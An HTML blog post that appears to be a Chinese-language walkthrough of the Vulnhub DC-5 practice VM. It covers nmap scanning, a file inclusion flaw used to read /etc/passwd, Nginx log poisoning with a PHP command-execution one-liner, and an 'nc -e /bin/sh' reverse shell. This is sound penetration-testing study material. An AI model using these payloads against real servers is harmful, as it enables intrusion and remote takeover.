@@ -1,0 +1,94 @@
+<!DOCTYPE html><html lang="en" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png"><link rel="icon" href="/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content=""><meta name="author" content="LeeX0"><meta name="keywords" content=""><title>Vulnhub DC-5 渗透测试(1) - LeeX0&#39;s blog</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"leex0.top",root:"/",version:"1.8.9-a",typing:{enable:!0,typeSpeed:60,cursorChar:"_",loop:!1},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},copy_btn:!0,image_zoom:{enable:!0},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:1},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>LeeX0's blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> Home</a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> Archives</a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> Categories</a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> Tags</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> About</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner" id="banner" parallax="true" style="background:url(/img/Royal_BluePetrol.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="Vulnhub DC-5 渗透测试(1)"></span><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> LeeX0 </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2021-04-07 15:41" pubdate>April 7, 2021 pm</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 1.3k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 22 分钟</span></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">Vulnhub DC-5 渗透测试(1)</h1><div class="markdown-body"><blockquote><p>进行了一次Vulnhub DC-5 渗透测试，内容较为简单，主要练习相关环境的建立与测试流程。</p><p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">https://www.vulnhub.com/entry/dc-5,314/</a></p></blockquote><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1. 主机发现"></a>1. 主机发现</h2><p>利用<code>netdiscover</code>发现主机，<code>192.168.203.130</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ netdiscover
+Currently scanning: 192.168.234.0&#x2F;16   |   Screen View: Unique Hosts
+
+2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname
+-----------------------------------------------------------------------------
+192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor
+192.168.205.7   00:0c:29:63:68:89      1      60  VMware, Inc.</code></pre></div><p>或者使用<code>nmap -sP 192.168.205.0/24</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.0&#x2F;24
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:48 CST
+Nmap scan report for 192.168.205.1
+Host is up (0.00036s latency).
+MAC Address: E2:B5:5F:2F:91:64 (Unknown)
+Nmap scan report for 192.168.205.7
+Host is up (0.0012s latency).
+MAC Address: 00:0C:29:63:68:89 (VMware)
+Nmap scan report for 192.168.205.4
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 2.08 seconds</code></pre></div><h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2. 端口扫描"></a>2. 端口扫描</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV -A 192.168.205.7
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-04-11 15:37 CST
+Nmap scan report for 192.168.205.7
+Host is up (0.00093s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE VERSION
+80&#x2F;tcp  open  http    nginx 1.6.2
+|_http-server-header: nginx&#x2F;1.6.2
+|_http-title: Welcome
+111&#x2F;tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port&#x2F;proto  service
+|   100000  2,3,4        111&#x2F;tcp   rpcbind
+|   100000  2,3,4        111&#x2F;udp   rpcbind
+|   100000  3,4          111&#x2F;tcp6  rpcbind
+|   100000  3,4          111&#x2F;udp6  rpcbind
+|   100024  1          43447&#x2F;tcp   status
+|   100024  1          46548&#x2F;udp6  status
+|   100024  1          53003&#x2F;udp   status
+|_  100024  1          60147&#x2F;tcp6  status
+MAC Address: 00:0C:29:63:68:89 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.93 ms 192.168.205.7
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds</code></pre></div><h2 id="3-入侵点测试"><a href="#3-入侵点测试" class="headerlink" title="3. 入侵点测试"></a>3. 入侵点测试</h2><p>可以看到主要可利用端口为<code>80</code>。</p><p>查看了Web页面，没有什么CMS，只有几个标题页脚和几个页面。</p><p>其中<code>Home</code>、<code>Solutions</code>、<code>About Us</code>、<code>FAQ</code>都是一些文字没有利用空间。</p><p>在<code>Contact</code>页面中有表单提交，进行尝试分析。</p><p>![image-20210411161140031](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161140031.png)</p><p>在提交了几次表单后，发现<strong>页脚的年份在不断变化</strong>。</p><p>可能是引入了<code>footer.php</code>来输出页脚信息。</p><p>![image-20210411161246026](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161246026.png)</p><h3 id="3-1-文件包含漏洞"><a href="#3-1-文件包含漏洞" class="headerlink" title="3.1 文件包含漏洞"></a>3.1 文件包含漏洞</h3><p>因为页脚信息可能是通过包含<code>footer.php</code>进行输出的，所以可能存在文件包含漏洞，这里简单读一下系统目录发现直接就能读：<code>http://192.168.205.7/thankyou.php?file=/etc/passwd</code></p><p>说明此处存在<strong>文件包含漏洞</strong>。</p><p>![image-20210411161805188](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411161805188.png)</p><p>同样可以使用伪协议来读取<code>thankyou.php</code>源码：<code>http://192.168.205.7/thankyou.php?file=php://filter/read=convert.base64-encode/resource=thankyou.php</code></p><p>![image-20210411162142698](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411162142698.png)</p><p>解码可以看到确实是通过包含<code>footer.php</code>用以输出页脚信息。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">···
+&lt;footer&gt;
+	&lt;?php
+		$file &#x3D; $_GET[&#39;file&#39;];
+		if(isset($file))&#123;
+			include(&quot;$file&quot;);
+		&#125;
+		else&#123;
+			include(&quot;footer.php&quot;);
+		&#125;
+	?&gt;
+&lt;&#x2F;footer&gt;
+···</code></pre></div><p>顺便看一下<code>footer.php</code>内容。</p><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;&#x2F;Random Gen Test
+$rndmYears &#x3D; array(
+    &quot;Copyright © 2017&quot;, 
+    &quot;Copyright © 2018&quot;, 
+    &quot;Copyright © 2019&quot;, 
+    &quot;Copyright © 2020&quot;
+);
+echo $rndmYears[mt_rand(0, count($rndmYears)-1)];
+?&gt;</code></pre></div><h3 id="3-2-Nginx日志"><a href="#3-2-Nginx日志" class="headerlink" title="3.2 Nginx日志"></a>3.2 <code>Nginx</code>日志</h3><p>可以看到Web服务器使用了<code>Nginx</code>服务器，可以探测是否具有<code>Nginx</code>日志利用的可能。</p><p>![image-20210411162652641](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411162652641.png)</p><p>查看<code>Nginx</code>配置文件：<code>http://192.168.205.7/thankyou.php?file=/etc/nginx/nginx.conf</code></p><p>![image-20210411163026501](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411163026501.png)</p><p>可以看到log存放的目录：</p><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;
+error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</code></pre></div><p>之后发包测试带入<code>&lt;?php phpinfo();?&gt;</code>看是否执行。</p><p>![image-20210411171626230](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411171626230.png)</p><p>之后验证读取日志文件：<code>http://192.168.205.7/thankyou.php?file=/var/log/nginx/error.log</code></p><p>![image-20210411171720343](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411171720343.png)</p><p>发现成功显示，说明Nginx日志写入命令成功执行。</p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><p>之后结合本地文件包含与Nginx日志进行Getshell。</p><p>传入一句话<code>http://192.168.205.7/thankyou.php?file=&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><p>![image-20210411172554154](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411172554154.png)</p><p>可以看到成功读取内容：<code>http://192.168.205.7/thankyou.php？file=/var/log/nginx/error.log&amp;cmd=ls</code></p><p>![image-20210411172655422](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411172655422.png)</p><p>反弹shell：<code>/thankyou.php?file=/var/log/nginx/error.log&amp;cmd=nc -e /bin/sh 192.168.205.4 4444</code></p><p>![image-20210411173848021](/Users/buddyholly/Library/Application Support/typora-user-images/image-20210411173848021.png)</p><p>nc连接，反弹成功。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nc -lvp 4444
+listening on [any] 4444 ...
+192.168.205.7: inverse host lookup failed: Unknown host
+connect to [192.168.205.4] from (UNKNOWN) [192.168.205.7] 57668
+ls
+about-us.php
+contact.php
+css
+faq.php
+footer.php
+images
+index.php
+solutions.php
+thankyou.php</code></pre></div><p>切换为交互式<code>bash</code>：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">···
+solutions.php
+thankyou.php
+python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;
+www-data@dc-5:~&#x2F;html$ ls
+ls
+about-us.php  css      footer.php  index.php	  thankyou.php
+contact.php   faq.php  images	   solutions.php
+www-data@dc-5:~&#x2F;html$</code></pre></div><p>之后为提权内容参见*Vulnhub DC-5 渗透测试(2)*。</p></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a> <a class="hover-with-bg" href="/tags/Vulnhub/">Vulnhub</a> <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a> <a class="hover-with-bg" href="/tags/Nginx/">Nginx</a></div></div><p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext"><article class="post-prev col-6"><a href="/posts/e6bc9214/"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">Vulnhub DC-5 渗透测试(2)</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/posts/98807702/"><span class="hidden-mobile">Mac删除Launchpad残留图标</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p><div class="toc-body" id="toc-body"></div></div></div></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></div></footer><script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/img-lazyload.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/components/prism-core.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/autoloader/prism-autoloader.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.js"></script><script src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>$("#local-search-input").on("click",(function(){searchFunc("/local-search.xml","local-search-input","local-search-result")})),$("#modalSearch").on("shown.bs.modal",(function(){$("#local-search-input").focus()}))</script><script src="/js/boot.js"></script></body></html>
